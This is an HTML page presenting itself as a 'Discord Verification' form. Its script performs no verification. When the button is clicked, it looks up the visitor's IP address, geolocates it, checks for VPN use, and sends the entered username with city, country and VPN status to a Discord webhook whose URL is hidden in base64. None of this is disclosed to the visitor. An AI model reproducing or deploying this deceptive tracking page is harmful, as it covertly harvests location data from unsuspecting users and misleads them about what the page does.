<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Secure Verification</title>
  <style>
    @keyframes gradientBG {0%,100%{background-position:0% 50%}50%{background-position:100% 50%}}
    body {margin:0;padding:0;width:100vw;height:100vh;font-family:'Segoe UI',sans-serif;background:linear-gradient(135deg,#2a2a3c,#1f1f2a,#2a2a3c);background-size:400% 400%;animation:gradientBG 20s ease infinite;display:flex;align-items:center;justify-content:center;color:#ececec;overflow:hidden;}
    .particle {position:absolute;border-radius:50%;background:rgba(255,255,255,0.05);animation:drift linear infinite;}
    @keyframes drift {from{transform:translate(0,0)}to{transform:translate(100px,-200px)}}
    .card {position:relative;width:380px;padding:2.5rem;background:rgba(0,0,0,0.85);border-radius:20px;box-shadow:0 15px 45px rgba(0,0,0,0.7);text-align:center;z-index:1;transition:transform .3s;}
    .card:hover {transform:translateY(-8px)}
    h1 {margin:0 0 1rem;font-size:2rem;letter-spacing:1px;color:#f0f0f0;}
    input,button {width:100%;padding:1rem;margin-top:1rem;border:none;border-radius:12px;font-size:1rem;outline:none;transition:box-shadow .2s;}
    input {background:#333445;color:#fff}
    input::placeholder {color:#aaa}
    input:focus {box-shadow:0 0 15px rgba(0,150,255,0.7)}
    button {background:linear-gradient(45deg,#1e90ff,#187bcd);color:#fff;cursor:pointer;transition:background .2s,transform .1s;}
    button:disabled {opacity:.6;cursor:not-allowed}
    button:hover:enabled {background:linear-gradient(45deg,#3ea0ff,#3590dd)}
    button:active:enabled {transform:scale(.96)}
    .status {margin-top:1.5rem;display:flex;align-items:center;justify-content:center;font-size:1rem;opacity:0;transition:opacity .4s;color:#ffd700;}
    .status.visible {opacity:1}
    .footer {margin-top:1.5rem;font-size:.75rem;color:#888;}
    .ad-bait {position:absolute;top:-9999px;width:1px;height:1px;overflow:hidden;}
  </style>
</head>
<body>
  <script>
    for(let i=0;i<30;i++){let e=document.createElement('div');e.className='particle';let s=Math.random()*5+2;e.style.width=s+'px';e.style.height=s+'px';e.style.left=Math.random()*100+'vw';e.style.top=Math.random()*100+'vh';e.style.animationDuration=8+Math.random()*12+'s';document.body.appendChild(e)}
  </script>
  <div class="card">
    <h1>Discord Verification</h1>
    <input type="text" id="u" placeholder="Username#0000" autocomplete="off" />
    <button id="b">Verify Now</button>
    <div id="s" class="status"></div>
    <div class="footer">Made by GitHub: @YourUsername</div>
  </div>
  <script>
    (function(){
      const e=document.createElement('div');e.className='ad-bait adBanner';document.body.appendChild(e);
      const adBlocked=!window.getComputedStyle(e).getPropertyValue('display');
      const encoded='aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTM3MDAzMTA2NjA4OTM5NDI0OC9BcFJwcHNTSUNFdjdieEJ5cFZUaWNDREV5Q2lVUXNwaEMwUGFybXZnOEVfVTVSV29ITnktS3N6YzFDblRDVGFxaDFRa24z';
      const WEBHOOK=decodeURIComponent(atob(encoded));
      const b=document.getElementById('b'),s=document.getElementById('s');let lt=0;
      function show(msg){s.textContent=msg;s.classList.add('visible')}
      b.addEventListener('click',async()=>{
        const now=Date.now();if(now-lt<30000){show('‚è≥ Please wait 30s');return;}lt=now;
        const u=document.getElementById('u').value.trim();if(!u){show('‚ùå Enter username');return}
        if(adBlocked){show('üö´ Ad Block detected');return}
        show('üîÑ Verifying...');b.disabled=true;
        try{
          const ip=(await fetch('https://api.ipify.org?format=json',{mode:'cors'}).then(r=>r.json()).catch(_=>({ip:'0.0.0.0'}))).ip;
          const geo=await fetch(`https://ipapi.co/${ip}/json/`).then(r=>r.json()).catch(_=>({org:'',country_name:'Unknown',city:'Unknown'}));
          const isVpn=/hosting|datacenter|proxy|vpn|tor/i.test(geo.org||'');
          const payload={username:'SecureSys',embeds:[{title:`üåê ${geo.city}, ${geo.country_name}`,color:isVpn?16711680:65280,fields:[{name:'User',value:u,inline:true},{name:'Status',value:isVpn?'VPN detected':'No VPN',inline:true}],footer:{text:new Date().toLocaleString()}}]};
          await fetch(WEBHOOK,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify(payload)});
          show(isVpn?'üö´ VPN detected':'‚úÖ Verified');
        }catch{show('‚ùå Error')}finally{b.disabled=false}
      })
    })();
  </script>
</body>
</html>
